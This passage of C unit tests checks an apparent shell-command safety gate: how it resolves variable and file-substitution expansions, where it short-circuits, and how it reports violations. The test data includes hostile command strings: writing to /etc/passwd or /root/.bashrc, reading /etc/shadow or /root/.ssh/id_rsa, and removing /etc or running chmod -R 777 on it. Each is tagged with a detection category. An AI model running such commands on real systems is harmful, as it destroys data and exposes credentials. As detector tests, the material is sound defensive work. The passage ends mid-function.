+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
+    for (unsigned resolved = 0; resolved < 2; resolved++) {
+      nested_path_expansion_t state = {
+          .leaf_status = resolved ? SG_EXPAND_RESOLVED : SG_EXPAND_UNRESOLVED,
+          .valid = true};
+      ASSERT_SG_OK(
+          sg_gate_set_expand_word_netargv(gate, expand_nested_path, &state));
+      sg_result_t result = {0};
+      ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
+      uint32_t expected =
+          !resolved && cases[i].leaves ? SG_EXPANSION_UNRESOLVED_PATH : 0;
+      if (result.unresolved_expansion_flags != expected)
+        printf("\n    nested path case %zu: flags=%u expected=%u\n", i,
+               result.unresolved_expansion_flags, expected);
+      ASSERT(state.valid && state.leaf_calls == cases[i].leaves &&
+             result.subcommand_count == cases[i].commands &&
+             result.unresolved_expansion_flags == expected);
+      for (unsigned ci = 0; ci < cases[i].commands; ci++) {
+        uint32_t owner_flag = !resolved && (cases[i].owners & (1u << ci))
+                                  ? SG_EXPANSION_UNRESOLVED_PATH
+                                  : 0;
+        ASSERT(result.subcommands[ci].unresolved_expansion_flags == owner_flag);
+      }
+    }
+  }
+  /* A known failed open does not undo nested pathname expansions already
+   * reached while producing that operand. */
+  for (unsigned failed_parent = 0; failed_parent < 2; failed_parent++) {
+    nested_path_expansion_t state = {.leaf_status = SG_EXPAND_UNRESOLVED,
+                                     .empty_redirect = !failed_parent,
+                                     .empty_file_parent = failed_parent,
+                                     .valid = true};
+    ASSERT_SG_OK(
+        sg_gate_set_expand_word_netargv(gate, expand_nested_path, &state));
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, "echo >\"$(<\"$(<\"$FILE\")\")\"", &result));
+    ASSERT(state.valid && state.leaf_calls == 1 &&
+           result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_PATH &&
+           result.subcommands[0].unresolved_expansion_flags ==
+               SG_EXPANSION_UNRESOLVED_PATH);
+  }
+  sg_gate_free(gate);
+}
+
+TEST(nested_path_expansion_stop_and_truncation) {
+  static const struct {
+    sg_stop_mode_t mode;
+    const char *first;
+  } stops[] = {{SG_STOP_FIRST_FAIL, "echo missing"},
+               {SG_STOP_FIRST_PASS, "echo ok"},
+               {SG_STOP_FIRST_ALLOW, "echo ok"},
+               {SG_STOP_FIRST_DENY, "echo denied"}};
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo ok"));
+  ASSERT_SG_OK(sg_gate_add_deny_cpl(gate, "echo denied"));
+  nested_path_expansion_t state = {.leaf_status = SG_EXPAND_UNRESOLVED,
+                                   .valid = true};
+  ASSERT_SG_OK(
+      sg_gate_set_expand_word_netargv(gate, expand_nested_path, &state));
+  for (size_t i = 0; i < sizeof(stops) / sizeof(stops[0]); i++) {
+    char source[128];
+    snprintf(source, sizeof(source),
+             "%s; { echo one; echo two; } "
+             ">\"$(<\"$FILE\")\"",
+             stops[i].first);
+    ASSERT_SG_OK(sg_gate_set_stop_mode(gate, stops[i].mode));
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, source, &result));
+    ASSERT(state.valid && result.short_circuited &&
+           result.subcommand_count == 1 &&
+           result.subcommands[0].unresolved_expansion_flags == 0 &&
+           result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_PATH);
+  }
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  sg_result_t result = {0};
+  ASSERT(eval_with_prefix(gate, "echo ok; echo >\"$(<\"$FILE\")\"", 8,
+                          &result) == SG_ERR_TRUNC);
+  ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED &&
+         result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_PATH);
+  sg_gate_free(gate);
+}
+
+TEST(nested_path_expansion_linear_metadata) {
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  size_t previous = 0;
+  for (unsigned count = 4; count <= 32; count *= 2) {
+    char source[2048];
+    size_t used = 0;
+    for (unsigned i = 0; i < count; i++) {
+      int written = snprintf(source + used, sizeof(source) - used,
+                             "echo >\"$(<\"$(<\"$FILE\")\")\"; ");
+      ASSERT(written > 0 && (size_t)written < sizeof(source) - used);
+      used += (size_t)written;
+    }
+    nested_path_expansion_t state = {.leaf_status = SG_EXPAND_UNRESOLVED,
+                                     .valid = true};
+    ASSERT_SG_OK(
+        sg_gate_set_expand_word_netargv(gate, expand_nested_path, &state));
+    shellsplit_test_source_scan_reset();
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, source, &result));
+    size_t work =
+        shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_EXPANSIONS);
+    ASSERT(state.valid && state.leaf_calls == count &&
+           result.subcommand_count == count && work <= 16 * count &&
+           (!previous || work <= 2 * previous + 1));
+    ASSERT(result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_PATH);
+    previous = work;
+  }
+  shellsplit_test_source_scan_reset();
+  sg_gate_free(gate);
+}
+
+TEST(expansion_path_failure_and_reachability_contract) {
+  static const struct {
+    const char *netargv;
+  } failures[] = {{""}, {"0:,"}, {"1:a,1:b,"}};
+  for (size_t i = 0; i < sizeof(failures) / sizeof(failures[0]); i++) {
+    expansion_rule_t rules[] = {
+        {"\"$FAIL\"", SG_EXPAND_WORD_REDIRECT_PATH, SG_EXPAND_RESOLVED,
+         failures[i].netargv, 0},
+        {"\"$SAME\"", SG_EXPAND_WORD_REDIRECT_PATH, SG_EXPAND_RESOLVED,
+         "9:/etc/same,", 0},
+        {"\"$LATER\"", SG_EXPAND_WORD_REDIRECT_PATH, SG_EXPAND_RESOLVED,
+         "10:/etc/later,", 0},
+    };
+    expansion_contract_t contract = {
+        .rules = rules,
+        .rule_count = sizeof(rules) / sizeof(rules[0]),
+        .valid = true,
+    };
+    sg_gate_t *gate = sg_gate_new();
+    ASSERT(gate != NULL);
+    ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
+                                                 &contract));
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(
+        gate, "echo first >\"$FAIL\" >\"$SAME\" && echo second >\"$LATER\"",
+        &result));
+    if (!contract.valid || contract.calls != 1)
+      printf("\n    failure case %zu: valid=%d calls=%zu rules=%zu/%zu/%zu\n",
+             i, contract.valid, contract.calls, rules[0].calls, rules[1].calls,
+             rules[2].calls);
+    ASSERT(contract.valid && contract.calls == 1);
+    ASSERT(rules[0].calls == 1 && rules[1].calls == 0 && rules[2].calls == 0);
+    ASSERT(result.subcommand_count == 2 && !result.truncated);
+    sg_gate_free(gate);
+  }
+
+  expansion_rule_t group_rules[] = {
+      {"\"$FAIL\"", SG_EXPAND_WORD_REDIRECT_PATH, SG_EXPAND_RESOLVED, "", 0},
+      {"\"$BODY\"", SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_RESOLVED, "3:hit,", 0},
+      {"\"$LATER\"", SG_EXPAND_WORD_REDIRECT_PATH, SG_EXPAND_RESOLVED,
+       "10:/etc/later,", 0},
+  };
+  expansion_contract_t group_contract = {
+      .rules = group_rules,
+      .rule_count = sizeof(group_rules) / sizeof(group_rules[0]),
+      .valid = true,
+  };
+  sg_gate_t *group_gate = sg_gate_new();
+  ASSERT(group_gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(group_gate, 0));
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(
+      group_gate, expand_by_source_word, &group_contract));
+  sg_result_t group_result = {0};
+  ASSERT_SG_OK(eval_cmd(group_gate,
+                        "{ echo \"$BODY\"; } >\"$FAIL\" && "
+                        "echo later >\"$LATER\"",
+                        &group_result));
+  ASSERT(group_contract.valid && group_contract.calls == 1);
+  ASSERT(group_rules[0].calls == 1 && group_rules[1].calls == 0 &&
+         group_rules[2].calls == 0);
+  sg_gate_free(group_gate);
+
+  expansion_rule_t never_rule = {"\"$NEVER\"", SG_EXPAND_WORD_REDIRECT_PATH,
+                                 SG_EXPAND_RESOLVED, "10:/etc/never,", 0};
+  expansion_contract_t never = {
+      .rules = &never_rule,
+      .rule_count = 1,
+      .valid = true,
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(
+      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &never));
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate, "false && echo x >\"$NEVER\"", &result));
+  ASSERT(never.valid && never.calls == 0 && never_rule.calls == 0);
+  sg_gate_free(gate);
+
+  expansion_rule_t unresolved_rule = {"\"$OUT\"", SG_EXPAND_WORD_REDIRECT_PATH,
+                                      SG_EXPAND_UNRESOLVED, NULL, 0};
+  expansion_contract_t unresolved = {
+      .rules = &unresolved_rule,
+      .rule_count = 1,
+      .valid = true,
+  };
+  gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
+                                               &unresolved));
+  ASSERT_SG_OK(eval_cmd(gate, ">\"$OUT\"", &result));
+  ASSERT(unresolved.valid && unresolved.calls == 1 &&
+         result.subcommand_count == 0 &&
+         (result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_PATH) !=
+             0);
+  sg_gate_free(gate);
+}
+
+typedef struct {
+  const char *path_record;
+  size_t path_length;
+  unsigned argument_calls;
+  bool cwd_valid;
+} substitution_status_fixture_t;
+
+static SHELL_NONNULL(1, 2, 3, 4) sg_expand_status_t
+    expand_substitution_status(const sg_expand_word_request_t *request,
+                               const char **netargv, size_t *length,
+                               void *context) {
+  substitution_status_fixture_t *fixture = context;
+  const char *word = request->source + request->word_offset;
+  if (request->word_length == 6 && memcmp(word, "\"$ARG\"", 6) == 0) {
+    fixture->argument_calls++;
+    fixture->cwd_valid &= request->cwd_known && request->cwd_absolute &&
+                          strcmp(request->cwd, "/workspace") == 0;
+    *netargv = "3:hit,";
+    *length = 6;
+    return SG_EXPAND_RESOLVED;
+  }
+  if (request->word_length == 7 && memcmp(word, "\"$PATH\"", 7) == 0) {
+    *netargv = fixture->path_record;
+    *length = fixture->path_length;
+    return SG_EXPAND_RESOLVED;
+  }
+  return SG_EXPAND_UNRESOLVED;
+}
+
+TEST(substitution_status_callback_reachability) {
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  substitution_status_fixture_t fixture = {.cwd_valid = true};
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_substitution_status,
+                                               &fixture));
+  for (size_t i = 0;
+       i < sizeof(shellsplit_test_substitution_status_cases) /
+               sizeof(shellsplit_test_substitution_status_cases[0]);
+       i++) {
+    for (unsigned success = 0; success < 2; success++) {
+      char source[512];
+      int length =
+          snprintf(source, sizeof(source), "%s %s echo \"$ARG\" >/etc/reached",
+                   shellsplit_test_substitution_status_cases[i].source,
+                   success ? "&&" : "||");
+      ASSERT(length > 0 && (size_t)length < sizeof(source));
+      fixture.argument_calls = 0;
+      sg_result_t result = {0};
+      ASSERT_SG_OK(eval_cmd(gate, source, &result));
+      bool expected =
+          success ? shellsplit_test_substitution_status_cases[i].succeeds
+                  : shellsplit_test_substitution_status_cases[i].fails;
+      if (fixture.argument_calls != (unsigned)expected)
+        printf("\n    status callback: %s calls=%u expected=%d\n", source,
+               fixture.argument_calls, expected);
+      ASSERT(fixture.argument_calls == (unsigned)expected && fixture.cwd_valid);
+      ASSERT(!!(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) ==
+             expected);
+    }
+  }
+  fixture.path_record = "0:,";
+  fixture.path_length = 3;
+  static const char *controls[] = {
+      "X=\"$(<\"\")\" && cd /etc; echo \"$ARG\"",
+      "X=\"$(<\"$PATH\")\" && cd /etc; echo \"$ARG\"",
+      "X=\"$(<\"$PATH\")\" || echo \"$ARG\"",
+      "echo \"$(<\"$PATH\")\" \"$ARG\"",
+      "X=\"$(false)\" <\"$PATH\" || echo \"$ARG\"",
+      "X=\"$(false)\" <\"$PATH\" && cd /etc; echo \"$ARG\"",
+      "X=\"$(false)\" {fd}>\"$PATH\" || echo \"$ARG\"",
+      "3<<<\"${MAYBE:?}\" 0>&0 || echo \"$ARG\"",
+  };
+  for (size_t i = 0; i < sizeof(controls) / sizeof(controls[0]); i++) {
+    fixture.argument_calls = 0;
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, controls[i], &result));
+    ASSERT(fixture.argument_calls == 1 && fixture.cwd_valid);
+  }
+  sg_gate_free(gate);
+}
+
+TEST(resolved_file_violation_details) {
+  static const struct {
+    const char *source, *path;
+    uint32_t type;
+  } cases[] = {
+      {"echo >\"$PATH\"", "/etc/passwd", SG_VIOL_WRITE_SENSITIVE},
+      {"echo >\"$PATH\"", "/root/.bashrc", SG_VIOL_PERSISTENCE},
+      {"echo \"$(<\"$PATH\")\"", "/etc/shadow", SG_VIOL_SUBST_SENSITIVE},
+      {"rm \"$PATH\"", "/etc", SG_VIOL_REMOVE_SYSTEM},
+      {"chmod -R 777 \"$PATH\"", "/etc", SG_VIOL_PERM_SYSTEM},
+      {"echo >\"$PATH\"; cat \"$PATH\"", "/tmp/matched",
+       SG_VIOL_WRITE_THEN_READ},
+      {"sudo echo >\"$PATH\"", "/tmp/out", SG_VIOL_SUDO_REDIRECT},
+      {"cat \"$PATH\"", "/root/.ssh/id_rsa", SG_VIOL_READ_SECRETS},
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  char record[256];
+  substitution_status_fixture_t fixture = {.path_record = record};
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_substitution_status,
+                                               &fixture));
+  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
+    int length = snprintf(record, sizeof(record), "%zu:%s,",
+                          strlen(cases[i].path), cases[i].path);
+    ASSERT(length > 0 && (size_t)length < sizeof(record));
+    fixture.path_length = (size_t)length;
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
+    memset(record, 'x',
+           sizeof(record)); /* Callback storage expires after eval. */
+    char expected[256];
+    snprintf(expected, sizeof(expected),
+             "resolved \"%s\" (source \"\\\"$PATH\\\"\")", cases[i].path);
+    bool found = false;
+    for (uint32_t violation = 0; violation < result.violation_count;
+         violation++)
+      if (result.violations[violation].type == cases[i].type) {
+        ASSERT_STR(result.violations[violation].detail, expected);
+        found = true;
+      }
+    if (!found)
+      printf("\n    missing resolved detail: %s type=%u flags=%u\n",
+             cases[i].source, cases[i].type, result.violation_type_flags);
+    ASSERT(found);
+  }
+  static const char special[] = "/etc/a\n\"\\\377";
+  ASSERT(shell_netstring_write(record, sizeof(record), special,
+                               sizeof(special) - 1,
+                               &fixture.path_length) == SHELL_NETSTRING_OK);
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate, "echo >\"$PATH\"", &result));
+  ASSERT(result.violation_count > 0);
+  ASSERT_STR(
+      result.violations[0].detail,
+      "resolved \"/etc/a\\x0A\\\"\\\\\\xFF\" (source \"\\\"$PATH\\\"\")");
+  static const char source[] = "echo >\"$PATH\"";
+  size_t workspace = sg_test_eval_workspace_size(sizeof(source) - 1);
+  size_t alignment = shell_dep_workspace_alignment();
+  char *storage = malloc(workspace + 256 + alignment - 1);
+  ASSERT(storage != NULL);
+  bool clipped_detail = false, completed = false;
+  for (size_t prefix = 1; prefix <= 256; prefix++) {
+    char *buffer = sg_test_eval_buffer_for_prefix(storage, prefix);
+    sg_error_t error = sg_gate_evaluate(gate, source, sizeof(source) - 1,
+                                        buffer, workspace + prefix, &result);
+    ASSERT(error == SG_OK || error == SG_ERR_TRUNC);
+    ASSERT(result_fields_stay_in_buffer(&result, buffer, prefix));
+    if (error == SG_ERR_TRUNC) {
+      ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED);
+      clipped_detail |=
+          result.violation_count != 0 && result.violations[0].detail != NULL;
+    } else
+      completed = true;
+  }
+  ASSERT(clipped_detail && completed);
+  free(storage);
+  ASSERT_SG_OK(eval_cmd(gate, "echo >/etc/passwd", &result));
+  ASSERT(result.violation_count > 0);
+  ASSERT_STR(result.violations[0].detail, "/etc/passwd");
+  sg_gate_free(gate);
+}
+
+TEST(file_substitution_path_failure_is_local) {
+  expansion_rule_t rules[] = {
+      {"\"$(<\"$FILE\")\"", SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_UNRESOLVED, NULL,
+       0},
+      {"\"$TAIL\"", SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_RESOLVED, "3:hit,", 0},
+      {"\"$FILE\"", SG_EXPAND_WORD_FILE_SUBSTITUTION_PATH, SG_EXPAND_RESOLVED,
+       "", 0},
+  };
+  expansion_contract_t contract = {
+      .rules = rules,
+      .rule_count = sizeof(rules) / sizeof(rules[0]),
+      .valid = true,
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(
+      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &contract));
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate, "echo \"$(<\"$FILE\")\" \"$TAIL\"", &result));
+  ASSERT(contract.valid && contract.calls == 3);
+  for (size_t i = 0; i < sizeof(rules) / sizeof(rules[0]); i++)
+    ASSERT(rules[i].calls == 1);
+  ASSERT(result.subcommand_count == 1);
+  ASSERT((result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_ARGV) !=
+         0);
+  ASSERT(!result.requires_substitution_evaluation);
+  sg_gate_free(gate);
+}
+
+static sg_expand_status_t
+expand_empty_path(const sg_expand_word_request_t *request, const char **netargv,
+                  size_t *length, void *context) {
+  unsigned *calls = context;
+  if (request->purpose == SG_EXPAND_WORD_ARGUMENT ||
+      request->word_length != sizeof("\"$FAIL\"") - 1 ||
+      memcmp(request->source + request->word_offset, "\"$FAIL\"",
+             request->word_length) != 0)
+    return SG_EXPAND_UNRESOLVED;
+  (*calls)++;
+  *netargv = "0:,";
+  *length = 3;
+  return SG_EXPAND_RESOLVED;
+}
+
+TEST(empty_path_static_resolved_equivalence) {
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  unsigned calls = 0;
+  ASSERT_SG_OK(
+      sg_gate_set_expand_word_netargv(gate, expand_empty_path, &calls));
+  size_t spellings = sizeof(shellsplit_test_empty_path_spellings) /
+                     sizeof(shellsplit_test_empty_path_spellings[0]);
+  for (size_t i = 0; i < sizeof(shellsplit_test_empty_paths) /
+                             sizeof(shellsplit_test_empty_paths[0]);
+       i++) {
+    uint32_t baseline_flags = 0, baseline_count = 0;
+    for (size_t spelling = 0; spelling <= spellings; spelling++) {
+      char source[256];
+      int length = snprintf(
+          source, sizeof(source), shellsplit_test_empty_paths[i].source,
+          spelling == spellings
+              ? "\"$FAIL\""
+              : shellsplit_test_empty_path_spellings[spelling]);
+      ASSERT(length > 0 && (size_t)length < sizeof(source));
+      calls = 0;
+      sg_result_t result = {0};
+      ASSERT_SG_OK(eval_cmd(gate, source, &result));
+      unsigned writes = 0, reads = 0;
+      for (uint32_t command = 0; command < result.subcommand_count; command++) {
+        writes += result.subcommands[command].write_count;
+        reads += result.subcommands[command].read_count;
+      }
+      unsigned expected = shellsplit_test_empty_paths[i].opens +
+                          shellsplit_test_empty_paths[i].writes;
+      if (writes != expected || reads != shellsplit_test_empty_paths[i].reads)
+        printf("\n    empty path %s: writes=%u reads=%u\n", source, writes,
+               reads);
+      ASSERT(writes == expected &&
+             reads == shellsplit_test_empty_paths[i].reads);
+      ASSERT(((result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0) ==
+             (expected != 0));
+      ASSERT(result.requires_substitution_evaluation ==
+             shellsplit_test_empty_paths[i].shell_word);
+      ASSERT(!result.truncated &&
+             calls == (spelling == spellings &&
+                       shellsplit_test_empty_paths[i].reached));
+      if (spelling == 0) {
+        baseline_flags = result.unresolved_expansion_flags;
+        baseline_count = result.subcommand_count;
+      }
+      ASSERT(result.unresolved_expansion_flags == baseline_flags &&
+             result.subcommand_count == baseline_count);
+    }
+  }
+  sg_gate_free(gate);
+}
+
+TEST(static_empty_path_callback_reachability) {
+  static const struct {
+    const char *source;
+    size_t argument_calls, tail_calls;
+  } cases[] = {
+      {"echo \"$ARG\" >\"\" >\"$LATER\"", 1, 0},
+      {"{ echo \"$ARG\"; } >\"\" >\"$LATER\"", 0, 0},
+      {"false && { echo \"$ARG\"; } >\"\"; echo \"$TAIL\"", 0, 1},
+      {"echo >\"\" || echo \"$TAIL\"", 0, 1},
+      {"echo >\"\" && echo \"$TAIL\"", 0, 0},
+      {"! { echo \"$ARG\"; } >\"\" || echo \"$TAIL\"", 0, 1},
+      {"echo \"$(<\"\")\" \"$TAIL\"", 0, 1},
+      {"{ echo \"$ARG\"; } >\"$BEFORE\" >\"\" >\"$LATER\"", 0, 0},
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
+    expansion_rule_t rules[] = {
+        {"\"$ARG\"", SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_RESOLVED, "3:hit,", 0},
+        {"\"$TAIL\"", SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_RESOLVED, "4:tail,",
+         0},
+        {"\"$LATER\"", SG_EXPAND_WORD_REDIRECT_PATH, SG_EXPAND_FAILED, NULL, 0},
+        {"\"$(<\"\")\"", SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_UNRESOLVED, NULL,
+         0},
+        {"\"$BEFORE\"", SG_EXPAND_WORD_REDIRECT_PATH, SG_EXPAND_RESOLVED,
+         "11:/tmp/before,", 0},
+    };
+    expansion_contract_t contract = {.rules = rules,
+                                     .rule_count =
+                                         sizeof(rules) / sizeof(rules[0]),
+                                     .valid = true};
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
+                                                 &contract));
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
+    ASSERT(contract.valid && rules[0].calls == cases[i].argument_calls &&
+           rules[1].calls == cases[i].tail_calls && rules[2].calls == 0);
+    ASSERT(rules[3].calls == (i == 6) && rules[4].calls == (i == 7));
+    ASSERT(!result.requires_substitution_evaluation && !result.truncated);
+  }
+  sg_gate_free(gate);
+}
+
+TEST(resolved_named_redirect_failure_effects) {
+  static const struct {
+    const char *source;
+    unsigned writes;
+    bool sensitive;
+  } cases[] = {
+      {"exec {fd}>\"$FAIL\"", 0, false},
+      {"true {fd}<>\"$FAIL\"", 0, false},
+      {"echo >\"$FAIL\" {fd}>/etc/later", 0, false},
+      {"{ echo hi; } >\"$FAIL\" {fd}>/etc/later", 0, false},
+      {"true {fd}>/etc/kept >\"$FAIL\"; echo >&\"$fd\"", 2, true},
+      {"exec {fd}>/etc/kept >\"$FAIL\"; echo >&\"$fd\"", 2, true},
+      {"true {fd}>\"$FAIL\" && echo >/etc/later", 0, false},
+      {"true {fd}>\"$FAIL\" || echo >/etc/later", 1, true},
+  };
+  static const char *failures[] = {"", "0:,", "1:a,1:b,"};
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  for (size_t failure = 0; failure < sizeof(failures) / sizeof(failures[0]);
+       failure++) {
+    for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
+      expansion_rule_t rule = {"\"$FAIL\"", SG_EXPAND_WORD_REDIRECT_PATH,
+                               SG_EXPAND_RESOLVED, failures[failure], 0};
+      expansion_contract_t contract = {
+          .rules = &rule, .rule_count = 1, .valid = true};
+      ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
+                                                   &contract));
+      sg_result_t result = {0};
+      ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
+      unsigned writes = 0;
+      for (uint32_t command = 0; command < result.subcommand_count; command++)
+        writes += result.subcommands[command].write_count;
+      ASSERT(contract.valid && rule.calls == 1 && writes == cases[i].writes);
+      ASSERT(((result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0) ==
+             cases[i].sensitive);
+    }
+  }
+  sg_gate_free(gate);
+}
+
+TEST(resolved_path_workspace_capacity_and_retry) {
+  static const char source[] = "echo; echo; echo >\"$OUT\"";
+  size_t source_length = sizeof(source) - 1;
+  size_t hint = sg_gate_evaluate_size_hint(source_length);
+  /* Each path span exceeds the complete ordinary workspace, forcing scratch
+   * and the identity pool into additional caller storage without relying on
+   * private index sizes or the current workspace's incidental spare bytes. */
+  size_t path_length = (hint + 3) & ~(size_t)1;
+  char *records = malloc(path_length + 32);
+  ASSERT(records != NULL);
+  int header = snprintf(records, 32, "%zu:", path_length);
+  ASSERT(header > 0 && header < 32);
+  char *path = records + header;
+  path[path_length] = ',';
+  path[path_length + 1] = 0;
+  expansion_rule_t rule = {"\"$OUT\"", SG_EXPAND_WORD_REDIRECT_PATH,
+                           SG_EXPAND_RESOLVED, records, 0};
+  expansion_contract_t contract = {
+      .rules = &rule, .rule_count = 1, .valid = true};
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/root/.ssh"));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo"));
+  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 5.0, NULL));
+  ASSERT_SG_OK(
+      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &contract));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  config.sensitive_write_paths[0] = "/root/.ssh/id";
+  config.sensitive_write_path_count = 1;
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  sg_gate_t *reference = sg_gate_new();
+  ASSERT(reference != NULL);
+  ASSERT_SG_OK(sg_gate_set_cwd(reference, "/root/.ssh"));
+  ASSERT_SG_OK(sg_gate_set_suggestions(reference, false));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(reference, "echo"));
+  ASSERT_SG_OK(sg_gate_enable_anomaly(reference, 5.0, NULL));
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(reference, &config));
+  st_netargv_view_t view = {records, (size_t)header + path_length + 1};
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(reference,
+                                               expand_requested_length, &view));
+
+  size_t extension =
+      2 * path_length + 1 + 2 * (source_length + SHELL_DEP_CWD_BUF_SIZE + 1u);
+  /* Resolved targets now also appear in owned violation diagnostics. */
+  size_t buffer_size = hint + extension + 2 * path_length + 256;
+  char *buffer = malloc(buffer_size);
+  ASSERT(buffer != NULL);
+  for (unsigned absolute = 0; absolute < 2; absolute++) {
+    size_t start = 0;
+    if (absolute) {
+      memcpy(path, "/root/.ssh//", 12);
+      start = 12;
+    }
+    for (size_t i = start; i < path_length - 2; i += 2)
+      memcpy(path + i, "./", 2);
+    memcpy(path + path_length - 2, "id", 2);
+    size_t vocabulary = sg_gate_anomaly_vocab_size(gate);
+    sg_result_t result = {0};
+    size_t calls = contract.calls;
